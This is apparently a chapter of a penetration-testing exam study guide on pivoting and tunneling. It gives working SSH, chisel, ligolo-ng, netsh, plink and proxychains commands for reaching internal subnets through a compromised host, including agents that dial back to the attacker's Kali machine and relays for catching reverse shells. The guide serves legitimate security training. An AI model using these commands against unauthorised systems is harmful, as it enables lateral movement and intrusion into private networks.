# 07 · Pivoting & tunneling

Once a foothold has a second NIC or can reach an internal subnet you can't, you pivot through it.
Pick the lightest tool that reaches the target.

| Situation | Reach for |
|---|---|
| SSH to a Linux pivot | `ssh -D` (SOCKS) or `sshuttle` |
| Windows pivot, no SSH | **ligolo-ng** (or chisel) |
| Firewalled — pivot must dial out | reverse chisel / ligolo |
| One port only | `ssh -L`, `socat`, or `netsh` |
| Whole subnet(s) / multi-hop | **ligolo-ng** |

> 🚩 **EXAM:** SSH, chisel, ligolo, socat, plink, netsh are all fine. Metasploit `autoroute` counts
> as MSF use.

---

## 7.1 SSH tunnels (Linux pivot with creds/key)

```bash
ssh -D 1080 -N -f user@pivot                       # dynamic SOCKS → proxychains everything
ssh -L 8080:172.16.1.10:80 user@pivot              # local: reach one internal service at localhost:8080
ssh -R 4444:localhost:4444 user@pivot              # remote: internal hosts reach YOUR listener via pivot:4444
ssh -J user@pivot user@internal                    # jump host
sshuttle -r user@pivot 172.16.0.0/24               # VPN-like, no proxychains (needs python on pivot)
```

## 7.2 Chisel (Windows / no SSH)

```bash
# Kali (server)                       # pivot (client) — reverse SOCKS
chisel server -p 8888 --reverse       ./chisel client <kali>:8888 R:1080:socks
```
Then route tools through it via proxychains (§7.5).

## 7.3 Ligolo-ng (best for subnets & multi-hop)

Creates a real interface — tools run natively, no proxychains.
```bash
# Kali
sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up
./proxy -selfcert
# pivot (agent dials back)
./agent -connect <kali>:11601 -ignore-cert          # Windows: allow the port in the firewall
# Kali ligolo console
ligolo-ng » session          → select agent
[Agent] » tunnel_start --tun ligolo
sudo ip route add 172.16.0.0/24 dev ligolo          # now reach the internal subnet directly
evil-winrm -i 172.16.0.10 -u u -p p
```
- **Reverse listeners** (pull files / catch shells from internal hosts that can't reach Kali):
  `[Agent] » listener_add --addr 0.0.0.0:9001 --to 127.0.0.1:4444 --tcp` → internal host hits `pivotIP:9001`.
- **Double pivot:** on agent 1 relay `listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601`, point agent 2 at
  agent 1, `tunnel_start` a second interface, add the deeper route.

> 💡 To reach a service bound only to the pivot's `127.0.0.1`: add a fake route (`sudo ip route add
> 240.0.0.1/32 dev ligolo`) and on the pivot `ip addr add 240.0.0.1/32 dev lo` (Linux) /
> `netsh interface ipv4 add address ...` (Windows), then hit `240.0.0.1`.

## 7.4 Windows-native forwards

```cmd
netsh interface portproxy add v4tov4 listenport=8080 connectport=80 connectaddress=172.16.1.10
plink.exe -D 1080 -N user@<kali> -pw pass          # SOCKS from a Windows pivot
```

## 7.5 Proxychains

```
# /etc/proxychains4.conf →  socks5 127.0.0.1 1080
proxychains4 nmap -sT -Pn -p21,22,80,135,139,445,3389,5985 172.16.1.10
proxychains4 netexec smb 172.16.1.0/24             # better than nmap for Windows subnets
proxychains4 evil-winrm -i 172.16.1.10 -u u -p p
```

> 💡 Through SOCKS, Nmap **must** use `-sT -Pn` (no SYN, no ping) or it hangs/lies. For host+port
> discovery on a Windows subnet, a `netexec`/`nc` sweep is faster than proxied Nmap.

## 7.6 Before you move on

- [ ] Second interface / reachable subnet identified (`ip a`, `ipconfig /all`, `route print`).
- [ ] Tunnel up and verified (`proxychains nc -zv <internal> 445` or ligolo route reachable).
- [ ] Internal hosts enumerated **through** the pivot — treat each as a fresh [§01](01-recon-and-enumeration.md) target.
- [ ] A working path for reverse shells/file transfers back to you (listener or relay).
